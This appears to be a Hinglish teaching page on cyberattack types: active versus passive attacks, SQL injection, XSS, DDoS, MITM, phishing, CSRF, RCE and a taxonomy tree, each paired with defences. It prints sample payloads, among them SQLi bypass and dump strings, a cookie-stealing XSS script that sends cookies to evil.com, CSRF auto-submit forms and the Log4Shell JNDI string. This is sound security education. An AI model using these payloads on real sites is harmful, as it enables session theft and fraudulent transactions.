ACTIVE vs PASSIVE

Sabse pehle samjho — attacks do categories mein hote hain. Ye fundamental hai baaki sab ke liye.

⚔ ACTIVE ATTACKS
Definition: An active attack involves direct interaction with the target system — modifying data, disrupting services, or gaining unauthorized access. The attacker's presence can often be detected.

Ye attacks "kuch karte hain" — data modify karte hain, system todne ki koshish karte hain, ya directly attack karte hain. Noise create hoti hai, detectible hote hain lekin zyada damage karte hain.

  • SQL Injection — database mein malicious code inject karna
  • DDoS — server ko requests se overwhelm karna
  • Ransomware — files encrypt karke ransom maangna
  • Brute Force — password guess karte rehna
  • Session Hijacking — active session churaana
👁 PASSIVE ATTACKS
Definition: A passive attack involves secretly monitoring or eavesdropping on communications without altering data or disrupting services. The attacker observes silently — very hard to detect.

Ye attacks "sirf dekhte hain" — data modify nahi karte. Silently information gather karte hain. Zyada dangerous isliye hai kyunki pata hi nahi chalta ki koi sun raha hai!

  • Packet Sniffing — network traffic monitor karna
  • Eavesdropping — unencrypted communications sunna
  • Traffic Analysis — patterns se information nikalna
  • Keylogging — keystrokes silently record karna
  • Port Scanning — open ports/services map karna
💉
Web Attack · Active · OWASP #3
SQL INJECTION
CRITICAL
📖 Definition
SQL Injection (SQLi) is an attack technique where malicious SQL statements are inserted into input fields, manipulating the backend database to reveal, modify, or delete data without authorization.
🤔 Hinglish Explanation
Socho ek website hai jahan login form hai. Tum username box mein apna naam likhte ho, aur website database se check karti hai. SQL injection mein hacker normal text ki jagah SQL code likhta hai — aur database usse command samajh ke execute kar deta hai!
Attack Example — Login Bypass
-- Normal login query:
SELECT * FROM users WHERE username='admin' AND password='pass123';

-- Hacker enters in username field:
admin' OR '1'='1

-- Resulting query (always TRUE = bypass login):
SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='anything';

-- Data dump attack:
' UNION SELECT username, password FROM users--
-- Dumps entire user database!
💥 Impact
Data theft Auth bypass DB deletion Admin access
🛡️ Defense
Prepared statements Input validation WAF Least privilege DB
🌍 Real Example
2009 mein Heartland Payment Systems pe SQLi attack hua — 130 million credit card numbers chori ho gaye. Ye US history ka sabse bada data breach tha at that time. Tool used: custom SQLi script.

Web Attack · Active · Client-Side
CROSS-SITE SCRIPTING (XSS)
HIGH
📖 Definition
Cross-Site Scripting (XSS) is a web vulnerability that allows attackers to inject malicious client-side scripts (usually JavaScript) into web pages viewed by other users, stealing their session data or performing actions on their behalf.
🤔 Hinglish Explanation
SQLi server ko attack karta hai, XSS browser ko attack karta hai. Hacker malicious JavaScript ek website pe plant karta hai. Jab koi user wo page kholta hai, unka browser wo script run karta hai — aur hacker ko unka session cookie, passwords ya personal data mil jaata hai!
Stored XSS — Comment Box Attack
-- Hacker posts this as a comment on a forum:
<script>
  document.location='https://evil.com/steal?c='+document.cookie;
</script>

-- Victim opens that page → their cookie sent to hacker!
-- Hacker uses cookie → logs in AS the victim

-- Reflected XSS (URL-based):
https://bank.com/search?q=<script>alert(document.cookie)</script>
-- If unfiltered, runs in victim's browser
Types of XSS
Stored XSS — Database mein save hoti hai, sab visitors ko affect karti hai.
Reflected XSS — URL mein hoti hai, specific victim ko target karte hain.
DOM-based XSS — Client-side JavaScript ke through hoti hai, server involved nahi.
💥 Impact
Session hijack Credential theft Defacement Malware spread
🛡️ Defense
Output encoding CSP headers Input sanitization HTTPOnly cookies

Network Attack · Active · Availability
DISTRIBUTED DENIAL OF SERVICE
CRITICAL
📖 Definition
A DDoS attack floods a target server, network, or service with massive traffic from multiple distributed sources (a botnet), overwhelming its capacity and making it unavailable to legitimate users.
🤔 Hinglish Explanation
Soch ek restaurant hai jo 100 log serve kar sakta hai. Agar 1 lakh log ek saath aakar tables rok lein toh real customers nahi aa sakte. DDoS exactly yahi karta hai — lakhs of infected computers (botnet) ek server pe fake requests bhejte hain jab tak crash na ho jaaye.
📋 Attack Flow — How DDoS Happens
1
Botnet Creation
Hacker pehle hazaron computers mein malware install karta hai bina owners ke pata chale. Ye sab "zombie" computers ban jaate hain — ek botnet.
2
Command Issued
Hacker C&C (Command & Control) server se sabko signal deta hai — "abhi attack karo [target IP]".
3
Traffic Flood
Lakhs of requests per second. SYN floods, UDP floods, HTTP floods — target ka bandwidth aur processing power exhaust ho jaata hai.
4
Service Down
Real users "504 Gateway Timeout" ya "Service Unavailable" dekhte hain. Har minute downtime = lakhs ka nuksaan companies ke liye.
💥 Impact
Service outage Revenue loss Reputation damage
🛡️ Defense
Cloudflare / CDN Rate limiting Traffic analysis BGP blackholing
🌍 Real Example
2020 mein AWS pe sabse bada DDoS attack — 2.3 Tbps traffic! Ye aaj bhi record hai. GitHub pe 2018 mein 1.35 Tbps memcached amplification attack hua tha. India mein bhi kai government websites DDoS ke through down ki gayi hain.

Network Attack · Active+Passive · Interception
MAN-IN-THE-MIDDLE (MITM)
CRITICAL
📖 Definition
A Man-in-the-Middle attack occurs when an attacker secretly intercepts and potentially alters communication between two parties who believe they are communicating directly with each other.
🤔 Hinglish Explanation
Soch tum apne dost ko letter bhej rahe ho. Beech mein ek daku wo letter chura leta hai, padhta hai, kabhi modify bhi karta hai — aur phir aage bhej deta hai. Dono ko pata nahi ki koi beech mein hai! MITM exactly yahi karta hai digital world mein.
ARP Poisoning — Common MITM Technique
-- Normal: User ↔ Router ↔ Internet
User (192.168.1.5) → Router (192.168.1.1) → Bank

-- After ARP Poisoning:
User thinks Router MAC = Hacker's MAC
Router thinks User MAC  = Hacker's MAC

-- All traffic now flows through hacker:
User → Hacker (intercepts/reads/modifies) → Router → Bank

-- Hacker sees: login creds, bank details, messages!
-- Tool used: Ettercap, arpspoof, Bettercap
Common MITM Variants
Evil Twin WiFi — Fake hotspot "Free_Airport_WiFi" banao, sab connect karein, sab traffic dekho.
SSL Stripping — HTTPS ko HTTP mein convert karo — encrypted data plain text mein aa jaata hai.
DNS Spoofing — DNS response modify karo taaki bank.com ki jagah fake website pe jaaye.
💥 Impact
Credential theft Data interception Session hijack Financial fraud
🛡️ Defense
HTTPS / TLS VPN use karo Certificate pinning Public WiFi avoid karo HSTS headers
🎣
Social Engineering · Active · Human Layer
PHISHING
HIGH
📖 Definition
Phishing is a social engineering attack that uses deceptive emails, messages, or websites impersonating trusted entities to trick victims into revealing sensitive information such as credentials, financial data, or installing malware.
🤔 Hinglish Explanation
Ye technology hack nahi hai — insaan ko hack karta hai! "Tumhara SBI account band hone wala hai, yahan click karo" — aur jo link dete hain wo fake SBI website hai. Tum password daalo, hacker le jaaye. India mein yahi sabse common cyberattack hai.
📋 Types of Phishing
📧
Email Phishing
Bulk emails — "Dear Customer, your account is compromised." Millions ko bhejo, kuch toh click karenge. Most common type.
🎯
Spear Phishing
Specific person ko target karo — LinkedIn se research karo, name/company use karo. "Hi Bhanu, regarding your project at [company]..." Much more convincing.
🐳
Whaling
CEO, CFO ko target karo. "CEO Fraud" — finance team ko fake CEO email: "urgently transfer ₹50 lakhs to this account." High value target.
📱
Smishing / Vishing
SMS phishing ("OTP verify karo") ya Voice phishing ("main bank officer bol raha hoon"). India mein OTP fraud isi se hota hai.
🛡️ Defense
Sender verify karo Links hover karo 2FA enable karo Security awareness training Email filters / SPF, DKIM
🔄
Web Attack · Active · Session Abuse
CROSS-SITE REQUEST FORGERY (CSRF)
HIGH
📖 Definition
CSRF tricks an authenticated user's browser into sending unauthorized requests to a web application, exploiting the trust the application has in the user's session — performing actions the victim never intended.
🤔 Hinglish Explanation
Tum bank mein logged in ho ek tab mein. Hacker tumhe ek email bhejta hai — ek innocent-looking link. Jab click karte ho, tumhara browser (jo bank pe logged in hai) automatically bank ko request bhejta hai "transfer ₹10,000 to hacker's account" — aur bank maan leta hai! Tum ne kuch nahi kiya, phir bhi transaction ho gayi.
CSRF Attack — Malicious Hidden Form
<!-- Hacker's evil website contains: -->
<img src="https://bank.com/transfer?to=hacker&amount=50000"
     style="display:none" />

<!-- OR a hidden auto-submit form: -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to"     value="hacker_account" />
  <input type="hidden" name="amount" value="50000" />
</form>
<script>document.forms[0].submit();</script>

<!-- Victim visits page while logged in to bank → transfer happens! -->
💥 Impact
Unauthorized transactions Account changes Data modification
🛡️ Defense
CSRF tokens SameSite cookies Referer header check Re-authentication

System Attack · Active · Most Dangerous
REMOTE CODE EXECUTION (RCE)
CRITICAL
📖 Definition
Remote Code Execution (RCE) is a vulnerability that allows an attacker to execute arbitrary code on a target machine over a network, often resulting in complete system compromise with the attacker gaining full control.
🤔 Hinglish Explanation
Ye sabse khatarnaak attack hai. Hacker tumhare computer pe baith ke koi bhi command chala sakta hai — remotely! Files delete karo, ransomware install karo, data nikalo, backdoor lagao — sab kuch. Log4Shell (2021) isi type ka attack tha jo billions of devices affect karta tha.
Famous RCE Vulnerabilities
💥
Log4Shell (CVE-2021-44228)
Java logging library Log4j mein. Ek simple string "${jndi:ldap://evil.com/a}" log karo aur server pe code execute ho jaata hai. Billions of servers affected.
💥
EternalBlue (MS17-010)
NSA ka leaked exploit, Windows SMB mein. WannaCry aur NotPetya ransomware ne isse use kiya — 200+ countries mein $10 billion ka nuksaan.
💥
Shellshock (CVE-2014-6271)
Bash shell vulnerability — web servers, routers, Mac systems sab affected. HTTP request mein command inject karo, server execute kar deta hai.
🛡️ Defense
Patch immediately Input validation Sandboxing Least privilege WAF rules Network segmentation

ATTACK TAXONOMY TREE

Poora picture ek jagah — attacks ka hierarchical structure.

// CYBER ATTACK TAXONOMY
  • ⚔ ACTIVE ATTACKS
    • ├ Web Application Attacks Server-side
      • ├ SQL Injection (SQLi) — DB manipulation
      • ├ Command Injection — OS commands via input
      • ├ XML Injection / XXE — XML parser abuse
      • └ File Inclusion (LFI/RFI) — include remote files
    • ├ Client-Side Attacks Browser
      • ├ XSS (Stored / Reflected / DOM)
      • ├ CSRF — forged requests
      • └ Clickjacking — hidden iframe trick
    • ├ Network Attacks Infrastructure
      • ├ DDoS (Volumetric / Protocol / App-layer)
      • ├ MITM (ARP Poisoning / SSL Strip / DNS Spoof)
      • ├ Session Hijacking — cookie theft
      • └ IP Spoofing — fake source address
    • ├ System / Host Attacks
      • ├ RCE — Remote Code Execution
      • ├ Buffer Overflow — memory corruption
      • ├ Privilege Escalation — higher access gain
      • └ Ransomware — encrypt & extort
    • └ Social Engineering Human
      • ├ Phishing / Spear Phishing / Whaling
      • ├ Vishing / Smishing
      • ├ Baiting — USB drops, fake downloads
      • └ Pretexting — fake identity/scenario
  • 👁 PASSIVE ATTACKS
    • ├ Network Surveillance
      • ├ Packet Sniffing — Wireshark, tcpdump
      • ├ Traffic Analysis — pattern extraction
      • └ Port Scanning — Nmap recon
    • └ Information Gathering (OSINT)
      • ├ Keylogging — hardware & software
      • ├ Shoulder Surfing — physical observation
      • └ Dumpster Diving — discarded documents
